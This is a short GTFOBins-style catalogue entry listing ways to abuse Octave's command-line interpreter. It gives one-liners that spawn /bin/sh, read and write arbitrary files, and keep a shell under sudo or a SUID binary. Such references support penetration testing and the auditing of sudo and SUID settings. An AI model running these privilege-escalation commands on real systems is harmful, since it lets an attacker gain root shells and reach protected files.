---
description: The payloads are compatible with GUI.
functions:
  shell:
    - code: octave-cli --eval 'system("/bin/sh")'
  file-write:
    - code: octave-cli --eval 'filename = "file_to_write"; fid = fopen(filename, "w"); fputs(fid, "DATA"); fclose(fid);'
  file-read:
    - code: octave-cli --eval 'format none; fid = fopen("file_to_read"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
  sudo:
    - code: sudo octave-cli --eval 'system("/bin/sh")'
  limited-suid:
    - code: ./octave-cli --eval 'system("/bin/sh")'
---
